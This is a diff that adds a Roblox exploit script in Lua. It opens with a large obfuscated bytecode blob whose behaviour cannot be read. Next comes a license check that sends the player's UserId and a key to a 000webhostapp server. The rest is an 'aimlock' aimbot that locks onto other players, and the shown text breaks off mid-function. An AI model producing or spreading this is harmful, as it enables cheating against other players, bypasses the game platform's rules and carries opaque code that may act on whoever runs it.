@@ -1,3 +1,527 @@
+local userid = game:GetService('Players').LocalPlayer.UserId
 
 
-local inactive = ('Obfuscator By inactive#2844') local a=string.byte;local h=string.char;local t=string.sub;local D=table.concat;local e=table.insert;local Q=math.ldexp;local C=getfenv or function()return _ENV end;local I=setmetatable;local r=select;local c=unpack or table.unpack;local d=tonumber;local function s(a)local l,n,o="","",{}local i=256;local c={}for e=0,i-1 do c[e]=h(e)end;local e=1;local function f()local l=d(t(a,e,e),36)e=e+1;local n=d(t(a,e,e+l-1),36)e=e+l;return n end;l=h(f())o[1]=l;while e<#a do local e=f()if c[e]then n=c[e]else n=l..t(l,1,1)end;c[i]=l..t(n,1,1)o[#o+1],l,i=n,n,i+1 end;return table.concat(o)end;local f=s('23G22Q27522R22W27522Q1E1D13161H1M1G1B1C1522R22U27915131F1722R22T2792161M1M1I211171M22R21V2791A27W1I1H22G2252251I1327F171027I224111D1F2251G131L22521J21121A21221022J1521H22R22Z27921I1727P1X1A17111927727927Z1M21D171G1K1B1127R29027521H1D1G191H28C29J27S27921E1E131R29F1H29A27521C1N1C29E29G29I27R23627921J1H29F2171C1I1N29D29F29H29T22X27921A1D11131E29W29Y29F22R22Y29B28021B1D1N2AE22R2332791X1N1G1G171C1M1X27P29F1328Z27921D1B1E2BD1M1Z1B1F22Q22R29U2752BR1F2AQ29827627827521E2BC1629I1M1B1D1C22O24A21D23L25J26X24M24I22L22R2302792BY2C019215171R28G1C1627L2792131C1N1F2BW22Q2CS1R1X1D1627R22R2CZ2D4152802DF1C1K2CM279212132161D2D929E27W27I152A122V2B82962982DK2751A2DP1927Q1M2BH1M2E22CX27T27521P21P27I2DA1Q22R2AB2751W2EF21I1D21C2BD2DA1G21D1M171I22O2792EY22Q22P2792322792D42D013102BO162BU2AY2BL172BO112EU2CX2F327529E2FF2FH21E131G1M22P2BK2752952FP132FG2AX2FJ22Q21H131B1M21029O2952BN2CX2AO2EK2D91R21314142971M2A12F127521522421922R2DW27521G2AT1N27R2CN2752102EF2GZ1G27F2G81E2CX23529B21C1Z1W1W21721821121P1X21921821D21I2H92HD21I2EY2202EY2DC2EZ22Q21U21S2EZ2DC21W1Y2792CN2DC2EX22U2282I12BU2762HT2HU2HW2EY2GL2DC2IF27922S2832752I22I82I52I72HS2HS2EZ2HV2EZ27M21W2292IO22Q2DW2IN2IK2IM2I62752AB2HS2142IA22Q2EX2752JA2I92HT21U22N2EZ22S2HR2IR2I92DC2GL2EY2EX2EX21U2JD22Q27T2342752F12AZ2HX2F02J92HU2JL22Q2902JR2I82DC2782K62JC2AO2JV22Q27M2G02792I42K121W2JB2K22DC2IZ2J32KM2752232K12EZ2J72EX2IQ22S22D2I821Z2K72KE2KP2L12DC22S2DW2EX21X2I82752J022Q2LA2J62K02EZ2EX2F12JC22Q2J72F12IQ2K12LK2EY2KD2LB2752C32BU2JN2171H1Z2GQ2792B22B427R2JN2162G422R2JI27521I2FP2DF2812GR22Q2952972992G02FL2GI17162FO2FQ2FT22Q2BM2BO2BE2BY2MA2B821028N27Q2FC2GS2FE2AR2G41R2A222Q2C52MP2C82CA1C2EY22A27921U22C2KT2I823423H2KE2NM22Q1W2K127M2EX2L72K12HQ2IQ2LD2NZ22Q2IV2I82782JM2L32792O62O32IW2K82IM2O82LV2J22792O22I82LL2IB2K12EX2GR2112K12I322Q2KY2K12J52OH2J42OX22Q2OJ2OS2EY2IS2JP2OT2I92LO2NJ2HW2F12F127T2OU2F12392L22LD2PG2DC2O12I82HZ2I823C2I82F12LD2PP2PK2KP23J2PM2OC22Q2PW2PK2OF2PZ2OZ2O22IS2LR2AZ21U23I2NQ2EX29L2752DW2IQ2K62DW2DW2LW2NQ27M2MH2K02PR2O32I92KK2O72LD2QS2Q22222I822S2L127M2KS2QT2KP2R227521A2QB2JO2R82F42ON2EY22L2LH2HT27M2LP2KL27M2LI2J82JS22O2LW2D42CP2AR2992MH2MJ2DZ2QD2LZ2D62121D1L1C2E022Q2RR2982D62CV2FI2FD2FM2MP2MR2812MB2MI2N12BH2N422Q21G2N6112N82NA2NC2C72FG2NF2MZ27527B1D191Z2812JY2NB1D1H2G42NF2EY2IC2JS2P32T92I92NX2752832O02KP2TG2JS2QG2TC2KT2OQ2I92NW2MH2TJ2LC2TI2LB2IQ2JC21U2H72ID2R92P32KL2KI2RL2NW2EY2TS2Q22TS2IQ2QG2162EZ2DW2K62KX2K22NM2EB2JW2JK2QO22Q2T22RC2JN2L22LL2LJ2792KD2F12SG2K62PB2K42EY27M2JN2K627M27M2JI2V52NQ2K92QE2O52U02L822Q2EJ2U62GL2LT2LP2NT27523421T2RB2VN2TP2NJ2K32F12UW2NQ2IT2LU2RB2RK2J82OL2OK2UI2IQ2QN2W32382W42DC2KD2P22W52QY22Q2VW2UK2RB2LR2KD2P52752KA2K12JI2KD27M2UP2RJ2K12VW2TX2UL2UX2WG2NP2DW2QD22Q2242K02VF2WR2NM2V92V72WG2752JI2QK2LC2P62JQ2VC2EX2AO2K62JI2DW2KG2JI2P52K627T2DC2B72792T227M22A22B2UO22Q2CN23122Q22A2262Y12AB2372Y52752AZ2JV2H72KD29023B2VT2V12902W92K62902902PG2EJ2AZ23A2V12YG22Q23E2HT2902OS2EJ29023F2Y122S22F2V12VS22Q2YT2IA2ZA2IY2792362SG2PP2X32YO2UV2OG23D2ZK22Q2AO2JC2KD2F32QA2XD2Z62B72IG2GL2ZC2EZ2ZC2UP2ZC2X322M22Q2782B72LL2902LW2K62782F12PW2ZR2VG2ZN2B72742ZU2Y22OR2VX31012EY2ZZ310Q2792W12Z92792WI2QX2782IL2XC2TA');local o=bit and bit.bxor or function(e,l)local n,o=1,0 while e>0 and l>0 do local t,c=e%2,l%2 if t~=c then o=o+n end e,l,n=(e-t)/2,(l-c)/2,n*2 end if e<l then e=l end while e>0 do local l=e%2 if l>0 then o=o+n end e,n=(e-l)/2,n*2 end return o end local function n(l,e,n)if n then local e=(l/2^(e-1))%2^((n-1)-(e-1)+1);return e-e%1;else local e=2^(e-1);return(l%(e+e)>=e)and 1 or 0;end;end;local e=1;local function l()local c,n,l,t=a(f,e,e+3);c=o(c,98)n=o(n,98)l=o(l,98)t=o(t,98)e=e+4;return(t*16777216)+(l*65536)+(n*256)+c;end;local function d()local l=o(a(f,e,e),98);e=e+1;return l;end;local function i()local l,n=a(f,e,e+2);l=o(l,98)n=o(n,98)e=e+2;return(n*256)+l;end;local function s()local e=l();local l=l();local t=1;local o=(n(l,1,20)*(2^32))+e;local e=n(l,21,31);local l=((-1)^n(l,32));if(e==0)then if(o==0)then return l*0;else e=1;t=0;end;elseif(e==2047)then return(o==0)and(l*(1/0))or(l*(0/0));end;return Q(l,e-1023)*(t+(o/(2^52)));end;local Q=l;local function E(l)local n;if(not l)then l=Q();if(l==0)then return'';end;end;n=t(f,e,e+l-1);e=e+l;local l={}for e=1,#n do l[e]=h(o(a(t(n,e,e)),98))end return D(l);end;local e=l;local function h(...)return{...},r('#',...)end local function K()local f={};local t={};local e={};local a={f,t,nil,e};local e=l()local o={}for n=1,e do local l=d();local e;if(l==0)then e=(d()~=0);elseif(l==2)then e=s();elseif(l==1)then e=E();end;o[n]=e;end;for e=1,l()do t[e-1]=K();end;for a=1,l()do local e=d();if(n(e,1,1)==0)then local t=n(e,2,3);local c=n(e,4,6);local e={i(),i(),nil,nil};if(t==0)then e[3]=i();e[4]=i();elseif(t==1)then e[3]=l();elseif(t==2)then e[3]=l()-(2^16)elseif(t==3)then e[3]=l()-(2^16)e[4]=i();end;if(n(c,1,1)==1)then e[2]=o[e[2]]end if(n(c,2,2)==1)then e[3]=o[e[3]]end if(n(c,3,3)==1)then e[4]=o[e[4]]end f[a]=e;end end;a[3]=d();return a;end;local function s(e,d,i)local n=e[1];local l=e[2];local e=e[3];return function(...)local o=n;local D=l;local t=e;local h=h local l=1;local a=-1;local K={};local Q={...};local r=r('#',...)-1;local f={};local n={};for e=0,r do if(e>=t)then K[e-t]=Q[e+1];else n[e]=Q[e+1];end;end;local e=r-t+1 local e;local t;while true do e=o[l];t=e[1];if t<=37 then if t<=18 then if t<=8 then if t<=3 then if t<=1 then if t==0 then local a;local t;n[e[2]]=i[e[3]];l=l+1;e=o[l];t=e[2];a=n[e[3]];n[t+1]=a;n[t]=a[e[4]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](c(n,t+1,e[3]))l=l+1;e=o[l];n[e[2]]=i[e[3]];l=l+1;e=o[l];t=e[2];a=n[e[3]];n[t+1]=a;n[t]=a[e[4]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](c(n,t+1,e[3]))l=l+1;e=o[l];n[e[2]]=i[e[3]];l=l+1;e=o[l];t=e[2];a=n[e[3]];n[t+1]=a;n[t]=a[e[4]];else n[e[2]]=d[e[3]];end;elseif t==2 then do return n[e[2]]end else n[e[2]]=i[e[3]];end;elseif t<=5 then if t==4 then n[e[2]]=n[e[3]]+n[e[4]];else if n[e[2]]then l=l+1;else l=e[3];end;end;elseif t<=6 then n[e[2]][e[3]]=n[e[4]];l=l+1;e=o[l];for e=e[2],e[3]do n[e]=nil;end;l=l+1;e=o[l];n[e[2]]=i[e[3]];l=l+1;e=o[l];n[e[2]]=i[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];elseif t==7 then local l=e[2]local o,e=h(n[l](c(n,l+1,e[3])))a=e+l-1 local e=0;for l=l,a do e=e+1;n[l]=o[e];end;else local l=e[2];do return n[l](c(n,l+1,e[3]))end;end;elseif t<=13 then if t<=10 then if t==9 then if not n[e[2]]then l=l+1;else l=e[3];end;else n[e[2]]=n[e[3]]*n[e[4]];end;elseif t<=11 then local l=e[2]n[l]=n[l](c(n,l+1,e[3]))elseif t>12 then n[e[2]]=n[e[3]]*n[e[4]];else n[e[2]][e[3]]=e[4];end;elseif t<=15 then if t==14 then local l=e[2];do return n[l](c(n,l+1,e[3]))end;else local e=e[2]n[e]=n[e](c(n,e+1,a))end;elseif t<=16 then n[e[2]]=(e[3]~=0);l=l+1;elseif t==17 then for e=e[2],e[3]do n[e]=nil;end;else do return end;end;elseif t<=27 then if t<=22 then if t<=20 then if t==19 then local i;local t;t=e[2];i=n[e[3]];n[t+1]=i;n[t]=i[e[4]];l=l+1;e=o[l];n[e[2]]=d[e[3]];l=l+1;e=o[l];n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];t=e[2]n[t]=n[t](c(n,t+1,e[3]))l=l+1;e=o[l];if n[e[2]]then l=l+1;else l=e[3];end;else n[e[2]]=n[e[3]];end;elseif t==21 then n[e[2]]=(e[3]~=0);else local e=e[2]n[e](n[e+1])end;elseif t<=24 then if t>23 then local e=e[2]n[e]=n[e]()else n[e[2]]=e[3];end;elseif t<=25 then if(n[e[2]]==e[4])then l=l+1;else l=e[3];end;elseif t>26 then local l=e[2]local o,e=h(n[l](c(n,l+1,e[3])))a=e+l-1 local e=0;for l=l,a do e=e+1;n[l]=o[e];end;else n[e[2]][e[3]]=n[e[4]];end;elseif t<=32 then if t<=29 then if t==28 then n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];n[e[2]]=d[e[3]];l=l+1;e=o[l];n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];n[e[2]]=n[e[3]]*n[e[4]];l=l+1;e=o[l];n[e[2]]=n[e[3]]+n[e[4]];l=l+1;e=o[l];if(n[e[2]]~=e[4])then l=l+1;else l=e[3];end;else do return end;end;elseif t<=30 then local e=e[2];do return c(n,e,a)end;elseif t>31 then n[e[2]]=n[e[3]]+n[e[4]];else n[e[2]]=e[3];end;elseif t<=34 then if t>33 then n[e[2]]=n[e[3]][e[4]];else if(n[e[2]]~=n[e[4]])then l=l+1;else l=e[3];end;end;elseif t<=35 then local d;local s,r;local f;local t;n[e[2]]=i[e[3]];l=l+1;e=o[l];n[e[2]]=i[e[3]];l=l+1;e=o[l];t=e[2];f=n[e[3]];n[t+1]=f;n[t]=f[e[4]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];n[e[2]]=(e[3]~=0);l=l+1;e=o[l];t=e[2]s,r=h(n[t](c(n,t+1,e[3])))a=r+t-1 d=0;for e=t,a do d=d+1;n[e]=s[d];end;l=l+1;e=o[l];t=e[2]n[t]=n[t](c(n,t+1,a))l=l+1;e=o[l];t=e[2]n[t]=n[t]()l=l+1;e=o[l];n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];n[e[2]]=(e[3]~=0);elseif t==36 then local o=n[e[4]];if not o then l=l+1;else n[e[2]]=o;l=e[3];end;else local o=n[e[4]];if not o then l=l+1;else n[e[2]]=o;l=e[3];end;end;elseif t<=56 then if t<=46 then if t<=41 then if t<=39 then if t>38 then n[e[2]]={};else if(n[e[2]]~=e[4])then l=l+1;else l=e[3];end;end;elseif t==40 then local l=e[2]n[l](c(n,l+1,e[3]))else n[e[2]]=(e[3]~=0);l=l+1;end;elseif t<=43 then if t==42 then n[e[2]]={};else local e=e[2]n[e]=n[e](c(n,e+1,a))end;elseif t<=44 then local t;n[e[2]][e[3]]=e[4];l=l+1;e=o[l];n[e[2]][e[3]]=e[4];l=l+1;e=o[l];n[e[2]]=i[e[3]];l=l+1;e=o[l];n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];n[e[2]][e[3]]=n[e[4]];l=l+1;e=o[l];n[e[2]]=i[e[3]];l=l+1;e=o[l];t=e[2]n[t]=n[t]()l=l+1;e=o[l];n[e[2]][e[3]]=n[e[4]];elseif t>45 then local a;local t;t=e[2]n[t]=n[t](c(n,t+1,e[3]))l=l+1;e=o[l];n[e[2]]=i[e[3]];l=l+1;e=o[l];t=e[2];a=n[e[3]];n[t+1]=a;n[t]=a[e[4]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](c(n,t+1,e[3]))l=l+1;e=o[l];n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];t=e[2];a=n[e[3]];n[t+1]=a;n[t]=a[e[4]];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];n[e[2]]={};else local e=e[2]n[e]=n[e](n[e+1])end;elseif t<=51 then if t<=48 then if t>47 then if(n[e[2]]~=n[e[4]])then l=l+1;else l=e[3];end;else for e=e[2],e[3]do n[e]=nil;end;end;elseif t<=49 then n[e[2]][e[3]]=e[4];elseif t==50 then l=e[3];else if(n[e[2]]~=e[4])then l=l+1;else l=e[3];end;end;elseif t<=53 then if t==52 then local l=e[2]n[l](c(n,l+1,e[3]))else local a=D[e[3]];local c;local t={};c=I({},{__index=function(l,e)local e=t[e];return e[1][e[2]];end,__newindex=function(n,e,l)local e=t[e]e[1][e[2]]=l;end;});for c=1,e[4]do l=l+1;local e=o[l];if e[1]==20 then t[c-1]={n,e[3]};else t[c-1]={d,e[3]};end;f[#f+1]=t;end;n[e[2]]=s(a,c,i);end;elseif t<=54 then local o=e[2];local l=n[e[3]];n[o+1]=l;n[o]=l[e[4]];elseif t>55 then n[e[2]]=n[e[3]][e[4]];else if not n[e[2]]then l=l+1;else l=e[3];end;end;elseif t<=66 then if t<=61 then if t<=58 then if t>57 then local e=e[2]n[e]=n[e](n[e+1])else local h=D[e[3]];local a;local t={};a=I({},{__index=function(l,e)local e=t[e];return e[1][e[2]];end,__newindex=function(n,e,l)local e=t[e]e[1][e[2]]=l;end;});for c=1,e[4]do l=l+1;local e=o[l];if e[1]==20 then t[c-1]={n,e[3]};else t[c-1]={d,e[3]};end;f[#f+1]=t;end;n[e[2]]=s(h,a,i);end;elseif t<=59 then do return n[e[2]]end elseif t==60 then local i;local t;t=e[2]n[t]=n[t](c(n,t+1,e[3]))l=l+1;e=o[l];n[e[2]]=n[e[3]];l=l+1;e=o[l];t=e[2];i=n[e[3]];n[t+1]=i;n[t]=i[e[4]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];n[e[2]]=e[3];else local i;local t;n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];n[e[2]]=d[e[3]];l=l+1;e=o[l];n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];t=e[2];i=n[e[3]];n[t+1]=i;n[t]=i[e[4]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](c(n,t+1,e[3]))l=l+1;e=o[l];n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];t=e[2];i=n[e[3]];n[t+1]=i;n[t]=i[e[4]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](c(n,t+1,e[3]))l=l+1;e=o[l];if(n[e[2]]==e[4])then l=l+1;else l=e[3];end;end;elseif t<=63 then if t==62 then local e=e[2]n[e](n[e+1])else local t;n[e[2]]=n[e[3]];l=l+1;e=o[l];n[e[2]]=n[e[3]];l=l+1;e=o[l];t=e[2];do return n[t](c(n,t+1,e[3]))end;l=l+1;e=o[l];t=e[2];do return c(n,t,a)end;l=l+1;e=o[l];do return end;end;elseif t<=64 then if(n[e[2]]==e[4])then l=l+1;else l=e[3];end;elseif t==65 then if n[e[2]]then l=l+1;else l=e[3];end;else local l=e[2]n[l]=n[l](c(n,l+1,e[3]))end;elseif t<=71 then if t<=68 then if t==67 then local e=e[2];do return c(n,e,a)end;else local o=e[2];local l=n[e[3]];n[o+1]=l;n[o]=l[e[4]];end;elseif t<=69 then n[e[2]][e[3]]=n[e[4]];elseif t>70 then local e=e[2]n[e]=n[e]()else n[e[2]]=i[e[3]];end;elseif t<=73 then if t==72 then local t;n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];n[e[2]]=d[e[3]];l=l+1;e=o[l];n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];n[e[2]]=n[e[3]]*n[e[4]];l=l+1;e=o[l];n[e[2]]=n[e[3]]+n[e[4]];l=l+1;e=o[l];n[e[2]]=d[e[3]];l=l+1;e=o[l];n[e[2]]=i[e[3]];l=l+1;e=o[l];n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];n[e[2]]=d[e[3]];l=l+1;e=o[l];n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];t=e[2]n[t]=n[t](c(n,t+1,e[3]))l=l+1;e=o[l];n[e[2]][e[3]]=n[e[4]];else l=e[3];end;elseif t<=74 then n[e[2]]=(e[3]~=0);elseif t==75 then n[e[2]]=d[e[3]];else n[e[2]]=n[e[3]];end;l=l+1;end;end;end;return s(K(),{},C())();
+local ip1 = 'https://thriller'; local ip2 = 'legit.000webhostapp.com/check.php?key=' .._G.key..'&user='..userid 
+local RealLink = ip1..ip2;
+
+_G.Key = game:HttpGet(RealLink) 
+if game:HttpGet(RealLink) == " " then
+wait(.5)
+
+---- then ur script goes here lol
+
+
+
+
+local http_request = http_request;
+if syn then
+	http_request = syn.request
+elseif SENTINEL_V2 then
+	function http_request(tb)
+		return {
+			StatusCode = 200;
+			Body = request(tb.Url, tb.Method, (tb.Body or ''))
+		}
+	end
+end
+
+if (not http_request) then
+	return game:GetService('Players').LocalPlayer:Kick('Unable to find proper request function')
+end
+
+-- // define hash function
+
+local hash; do
+    local MOD = 2^32
+    local MODM = MOD-1
+    local bxor = bit32.bxor;
+    local band = bit32.band;
+    local bnot = bit32.bnot;
+    local rshift1 = bit32.rshift;
+    local rshift = bit32.rshift;
+    local lshift = bit32.lshift;
+    local rrotate = bit32.rrotate;
+
+    local str_gsub = string.gsub;
+    local str_fmt = string.format;
+    local str_byte = string.byte;
+    local str_char = string.char;
+    local str_rep = string.rep;
+
+    local k = {
+	    0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5,
+	    0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
+	    0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3,
+	    0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
+	    0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc,
+	    0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
+	    0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7,
+	    0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
+	    0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13,
+	    0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
+	    0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3,
+	    0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
+	    0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5,
+	    0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
+	    0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208,
+	    0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2,
+    }
+    local function str2hexa(s)
+        return (str_gsub(s, ".", function(c) return str_fmt("%02x", str_byte(c)) end))
+    end
+    local function num2s(l, n)
+        local s = ""
+        for i = 1, n do
+            local rem = l % 256
+            s = str_char(rem) .. s
+            l = (l - rem) / 256
+        end
+        return s
+    end
+    local function s232num(s, i)
+        local n = 0
+        for i = i, i + 3 do n = n*256 + str_byte(s, i) end
+        return n
+        end
+        local function preproc(msg, len)
+        local extra = 64 - ((len + 9) % 64)
+        len = num2s(8 * len, 8)
+        msg = msg .. "\128" .. str_rep("\0", extra) .. len
+        assert(#msg % 64 == 0)
+        return msg
+    end
+    local function initH256(H)
+        H[1] = 0x6a09e667
+        H[2] = 0xbb67ae85
+        H[3] = 0x3c6ef372
+        H[4] = 0xa54ff53a
+        H[5] = 0x510e527f
+        H[6] = 0x9b05688c
+        H[7] = 0x1f83d9ab
+        H[8] = 0x5be0cd19
+        return H
+    end
+    local function digestblock(msg, i, H)
+        local w = {}
+        for j = 1, 16 do w[j] = s232num(msg, i + (j - 1)*4) end
+        for j = 17, 64 do
+            local v = w[j - 15]
+            local s0 = bxor(rrotate(v, 7), rrotate(v, 18), rshift(v, 3))
+            v = w[j - 2]
+            w[j] = w[j - 16] + s0 + w[j - 7] + bxor(rrotate(v, 17), rrotate(v, 19), rshift(v, 10))
+        end
+        local a, b, c, d, e, f, g, h = H[1], H[2], H[3], H[4], H[5], H[6], H[7], H[8]
+        for i = 1, 64 do
+            local s0 = bxor(rrotate(a, 2), rrotate(a, 13), rrotate(a, 22))
+            local maj = bxor(band(a, b), band(a, c), band(b, c))
+            local t2 = s0 + maj
+            local s1 = bxor(rrotate(e, 6), rrotate(e, 11), rrotate(e, 25))
+            local ch = bxor(band(e, f), band(bnot(e), g))
+            local t1 = h + s1 + ch + k[i] + w[i]
+            h, g, f, e, d, c, b, a = g, f, e, d + t1, c, b, a, t1 + t2
+        end
+        H[1] = band(H[1] + a)
+        H[2] = band(H[2] + b)
+        H[3] = band(H[3] + c)
+        H[4] = band(H[4] + d)
+        H[5] = band(H[5] + e)
+        H[6] = band(H[6] + f)
+        H[7] = band(H[7] + g)
+        H[8] = band(H[8] + h)
+    end
+    function hash(msg, t) 
+        msg = preproc(msg, #msg)
+        local H = initH256({})
+        for i = 1, #msg, 64 do digestblock(msg, i, H) end
+        return str2hexa(num2s(H[1], 4) .. num2s(H[2], 4) .. num2s(H[3], 4) .. num2s(H[4], 4) .. num2s(H[5], 4) .. num2s(H[6], 4) .. num2s(H[7], 4) .. num2s(H[8], 4))
+    end
+end
+
+local key = 'key_synapse'
+local data = http_request({
+	Url = ('https://thrillerlegit.000webhostapp.com/server.php?key=' .. key);
+	Method = 'GET';
+})
+
+if data.StatusCode == 200 then
+	-- // if the request did not error...
+	local response = data.Body;
+	if response == hash(key) then
+	    
+	    ---player is hwid whitelisted so the script goes here
+		
+    getgenv().OldAimPart = "UpperTorso"
+    getgenv().AimPart = "UpperTorso"
+    getgenv().AimlockKey = "q"
+    getgenv().AimRadius = 8 
+    getgenv().ThirdPerson = true
+    getgenv().FirstPerson = true
+    getgenv().TeamCheck = false 
+    getgenv().PredictMovement = true 
+    getgenv().PredictionVelocity = 7.22
+    getgenv().CheckIfJumped = true
+    getgenv().Smoothness = true
+    getgenv().SmoothnessAmount = 0.0195
+
+    local Players, Uis, RService, SGui =
+        game:GetService "Players",
+        game:GetService "UserInputService",
+        game:GetService "RunService",
+        game:GetService "StarterGui"
+    local Client, Mouse, Camera, CF, RNew, Vec3, Vec2 =
+        Players.LocalPlayer,
+        Players.LocalPlayer:GetMouse(),
+        workspace.CurrentCamera,
+        CFrame.new,
+        Ray.new,
+        Vector3.new,
+        Vector2.new
+    local Aimlock, MousePressed, CanNotify = true, false, false
+    local AimlockTarget
+    local OldPre
+
+    getgenv().WorldToViewportPoint = function(P)
+        return Camera:WorldToViewportPoint(P)
+    end
+
+    getgenv().WorldToScreenPoint = function(P)
+        return Camera.WorldToScreenPoint(Camera, P)
+    end
+
+    getgenv().GetObscuringObjects = function(T)
+        if T and T:FindFirstChild(getgenv().AimPart) and Client and Client.Character:FindFirstChild("Head") then
+            local RayPos = workspace:FindPartOnRay(RNew(T[getgenv().AimPart].Position, Client.Character.Head.Position))
+            if RayPos then
+                return RayPos:IsDescendantOf(T)
+            end
+        end
+    end
+
+    getgenv().GetNearestTarget = function()
+        
+        local players = {}
+        local PLAYER_HOLD = {}
+        local DISTANCES = {}
+        for i, v in pairs(Players:GetPlayers()) do
+            if v ~= Client then
+                table.insert(players, v)
+            end
+        end
+        for i, v in pairs(players) do
+            if v.Character ~= nil then
+                local AIM = v.Character:FindFirstChild("Head")
+                if getgenv().TeamCheck == true and v.Team ~= Client.Team then
+                    local DISTANCE =
+                        (v.Character:FindFirstChild("Head").Position - game.Workspace.CurrentCamera.CFrame.p).magnitude
+                    local RAY =
+                        Ray.new(
+                        game.Workspace.CurrentCamera.CFrame.p,
+                        (Mouse.Hit.p - game.Workspace.CurrentCamera.CFrame.p).unit * DISTANCE
+                    )
+                    local HIT, POS = game.Workspace:FindPartOnRay(RAY, game.Workspace)
+                    local DIFF = math.floor((POS - AIM.Position).magnitude)
+                    PLAYER_HOLD[v.Name .. i] = {}
+                    PLAYER_HOLD[v.Name .. i].dist = DISTANCE
+                    PLAYER_HOLD[v.Name .. i].plr = v
+                    PLAYER_HOLD[v.Name .. i].diff = DIFF
+                    table.insert(DISTANCES, DIFF)
+                elseif getgenv().TeamCheck == false and v.Team == Client.Team then
+                    local DISTANCE =
+                        (v.Character:FindFirstChild("Head").Position - game.Workspace.CurrentCamera.CFrame.p).magnitude
+                    local RAY =
+                        Ray.new(
+                        game.Workspace.CurrentCamera.CFrame.p,
+                        (Mouse.Hit.p - game.Workspace.CurrentCamera.CFrame.p).unit * DISTANCE
+                    )
+                    local HIT, POS = game.Workspace:FindPartOnRay(RAY, game.Workspace)
+                    local DIFF = math.floor((POS - AIM.Position).magnitude)
+                    PLAYER_HOLD[v.Name .. i] = {}
+                    PLAYER_HOLD[v.Name .. i].dist = DISTANCE
+                    PLAYER_HOLD[v.Name .. i].plr = v
+                    PLAYER_HOLD[v.Name .. i].diff = DIFF
+                    table.insert(DISTANCES, DIFF)
+                end
+            end
+        end
+
+        if unpack(DISTANCES) == nil then
+            return nil
+        end
+
+        local L_DISTANCE = math.floor(math.min(unpack(DISTANCES)))
+        if L_DISTANCE > getgenv().AimRadius then
+            return nil
+        end
+
+        for i, v in pairs(PLAYER_HOLD) do
+            if v.diff == L_DISTANCE then
+                return v.plr
+            end
+        end
+        return nil
+    end
+
+    Mouse.KeyDown:Connect(
+        function(a)
+            if not (Uis:GetFocusedTextBox()) then
+                if a == AimlockKey and AimlockTarget == nil then
+                    pcall(
+                        function()
+                            if MousePressed ~= true then
+                                MousePressed = true
+                            end
+                            local Target
+                            Target = GetNearestTarget()
+                            if Target ~= nil then
+                                AimlockTarget = Target
+                            end
+                        end
+                    )
+                elseif a == AimlockKey and AimlockTarget ~= nil then
+                    if AimlockTarget ~= nil then
+                        AimlockTarget = nil
+                    end
+                    if MousePressed ~= false then
+                        MousePressed = false
+                    end
+                end
+            end
+        end
+    )
+
+    RService.RenderStepped:Connect(
+        function()
+            if getgenv().ThirdPerson == true and getgenv().FirstPerson == true then
+                if
+                    (Camera.Focus.p - Camera.CoordinateFrame.p).Magnitude > 1 or
+                        (Camera.Focus.p - Camera.CoordinateFrame.p).Magnitude <= 1
+                 then
+                    CanNotify = true
+                else
+                    CanNotify = false
+                end
+            elseif getgenv().ThirdPerson == true and getgenv().FirstPerson == false then
+                if (Camera.Focus.p - Camera.CoordinateFrame.p).Magnitude > 1 then
+                    CanNotify = true
+                else
+                    CanNotify = false
+                end
+            elseif getgenv().ThirdPerson == false and getgenv().FirstPerson == true then
+                if (Camera.Focus.p - Camera.CoordinateFrame.p).Magnitude <= 1 then
+                    CanNotify = true
+                else
+                    CanNotify = false
+                end
+            end
+            if Aimlock == true and MousePressed == true then
+                if
+                    AimlockTarget and AimlockTarget.Character and
+                        AimlockTarget.Character:FindFirstChild(getgenv().AimPart)
+                 then
+                    if getgenv().FirstPerson == true then
+                        if CanNotify == true then
+                            if getgenv().PredictMovement == true then
+                                if getgenv().Smoothness == true then
+                                    
